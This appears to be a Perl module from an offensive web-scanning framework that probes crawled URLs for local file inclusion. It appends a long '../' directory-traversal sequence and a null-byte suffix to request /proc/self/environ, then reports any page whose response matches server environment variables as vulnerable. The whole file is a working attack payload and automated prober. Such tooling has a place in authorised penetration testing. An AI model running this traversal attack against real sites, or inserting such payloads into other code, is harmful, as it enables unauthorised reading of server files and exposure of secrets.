package Resources::WebVuln::LFI;
use Nemesis::BaseRes -base;
use Resources::Network::HTTPInterface;

has 'Crawler';
has 'Bug';
has 'Test'      => sub {"/proc/self/environ"};
has 'TestRegex' => sub {"DOCUMENT_ROOT=\/|HTTP_USER_AGENT"};


sub test() {
    my $self = shift;
    my @URLS = @{ $self->Crawler->stripLinks };
    foreach my $url (@URLS) {
        $self->Init->getIO()->print_info("Trying against $url");
        my $Test
            = "http://"
            . $url
            . $self->Bug
            . "../../../../../../../../../../../../../"
            . $self->Test . "%0000";
        my $response=Resources::Network::HTTPInterface->new->get($Test);
        my $Content = $response->{content};
        my $r       = $self->TestRegex;
        if ( $Content =~ /$r/i ) {
            $self->Init->getIO()->print_info( $Test . " is vulnerable" );
        }
    }
}

1;
